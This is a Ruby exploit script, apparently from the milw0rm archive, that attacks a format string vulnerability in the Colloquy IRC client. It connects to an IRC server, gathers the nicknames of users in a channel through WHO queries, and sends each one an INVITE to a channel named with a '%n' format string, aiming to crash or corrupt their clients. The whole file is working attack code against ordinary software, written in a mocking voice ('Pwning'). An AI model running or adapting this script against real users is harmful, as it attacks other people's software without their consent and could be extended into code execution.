#!/usr/bin/ruby
# (c) Copyright 2006 Lance M. Havok <lmh@info-pull.com>
#
# Makes use of the Colloquy INVITE format string vulnerability.
#

require 'socket'

target_channel  = (ARGV[0] || "#whatever")
target_server   = (ARGV[1] || "irc.server.org")
target_port     = (ARGV[2] || 6667)

rand_nick       = "spongebo"
channel_joined  = false
ready_to_go     = false
abuse_attempts  = 2
chan_fmtstring  = ("#%n%n%n%n") # develop payload when feeling like it.
target_furries = []

irc_socket = TCPSocket.new(target_server, target_port.to_i)

irc_socket.print "USER #{rand_nick} localhost localhost r\n"
irc_socket.print "NICK #{rand_nick}\r\n"
while true
  s = irc_socket.gets
  case s.strip
    when /^PING :(.+)$/i
      puts "++ PING..."
      irc_socket.send "PONG :#{$1}\n", 0
      puts "++ PONG."
    when /^:(.+?)!(.+?)@(.+?)\sPRIVMSG\s.+\s:[\001]PING (.+)[\001]$/i
      puts "++ CTCP PING from #{$1}!#{$2}@#{$3}"
      irc_socket.send "NOTICE #{$1} :\001PING #{$4}\001\n", 0
    when /^:(.+?)!(.+?)@(.+?)\sPRIVMSG\s.+\s:[\001]VERSION[\001]$/i
      puts "++ CTCP VERSION from #{$1}!#{$2}@#{$3}"
      irc_socket.send "NOTICE #{$1} :\001VERSION Unabomber v0.011\001\n", 0
    when /n=(.+) (.+) (.+) (.+) (.+) (.*)$/i
      nickarr = s.scan(/n=(.+) (.+) (.+) (.+) (.+) (.*)/).flatten

      if nickarr.size > 3
        if nickarr[2].size > 2 and nickarr[2] != target_server
          nickarr = nickarr[2]
        elsif nickarr[1].size > 2 and nickarr[1] != target_server
          nickarr = nickarr[1]
        elsif nickarr[3].size > 2 and nickarr[3] != target_server
          nickarr = nickarr[3]
        end
        
        target_furries << nickarr
      end
    else
      unless channel_joined
        #irc_socket.send "JOIN #{target_channel}\n", 0 (uncomment to join channel)
        irc_socket.send "JOIN #{chan_fmtstring}\n", 0
        channel_joined = true
      end
      
      if channel_joined and abuse_attempts != 0
        irc_socket.send "WHO #{target_channel}\n", 0
        abuse_attempts -= 1
      end

      # we need to throttle the pwnage or server will kick our ass
      if target_furries.size > 1
        target_furries.each do |zealot|
          puts "++ Pwning #{zealot}"
          irc_socket.send "INVITE #{zealot} #{chan_fmtstring}\n", 0
          sleep 1
        end
      end
  end
end

# milw0rm.com [2007-01-17]
